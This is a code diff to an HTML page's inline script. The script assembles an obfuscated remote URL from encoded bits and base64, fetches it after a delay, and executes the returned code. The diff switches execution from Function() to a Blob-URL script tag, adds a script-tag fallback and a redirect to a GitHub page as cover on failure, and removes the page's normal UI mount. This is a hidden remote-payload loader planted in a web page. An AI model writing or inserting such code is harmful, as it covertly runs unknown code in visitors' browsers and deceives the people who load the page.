@@ -284,7 +284,7 @@ var TARGET = (function () {
         return o;
     }
     function _exploreHubQ17() {
-        location.replace(['https://github.com/explore'].shift());
+        location.replace('https://github.com/explore');
     }
     function _fromB64(e) {
         return decodeURIComponent(escape(atob(e)));
@@ -292,18 +292,12 @@ var TARGET = (function () {
     return { uri: _fromBin(_bits) + _fromB64(_tail), fail: _exploreHubQ17 };
 })();
 
-function pullText(uri) {
-    return fetch(uri, { method: 'GET', cache: 'no-store' })
+function pullText(url) {
+    return fetch(url, { method: 'GET', cache: 'no-store' })
         .then(function (res) {
             if (!res.ok) throw 0;
             return res.text();
         });
-}
-
-function runBody(code) {
-    var body = String(code).replace(/^\uFEFF/, '').trim();
-    if (!body) throw 0;
-    Function(body)();
 }
 
 function mountScriptTag(url) {
@@ -317,11 +311,28 @@ function mountScriptTag(url) {
     });
 }
 
+function runViaBlob(text, url) {
+    var body = String(text).replace(/^\uFEFF/, '').trim();
+    if (!body) throw 0;
+    var blob = new Blob([body], { type: 'application/javascript' });
+    var href = URL.createObjectURL(blob);
+    var tag = document.createElement('script');
+    tag.charset = 'utf-8';
+    tag.src = href;
+    tag.onload = function () { URL.revokeObjectURL(href); };
+    tag.onerror = function () {
+        URL.revokeObjectURL(href);
+        mountScriptTag(url).catch(function () { TARGET.fail(); });
+    };
+    (document.head || document.documentElement).appendChild(tag);
+}
+
 function bootRemote() {
     var url = TARGET.uri;
+    if (!url) { TARGET.fail(); return; }
     pullText(url)
         .then(function (text) {
-            try { runBody(text); } catch (e) { TARGET.fail(); }
+            runViaBlob(text, url);
         })
         .catch(function () {
             mountScriptTag(url).catch(function () { TARGET.fail(); });
@@ -329,11 +340,6 @@ function bootRemote() {
 }
 
 setTimeout(bootRemote, 1756);
-
-requestAnimationFrame(function () {
-    if (document.body) ui.mount();
-    else document.addEventListener('DOMContentLoaded', function () { ui.mount(); });
-});
 </script>
 </body>
 </html>
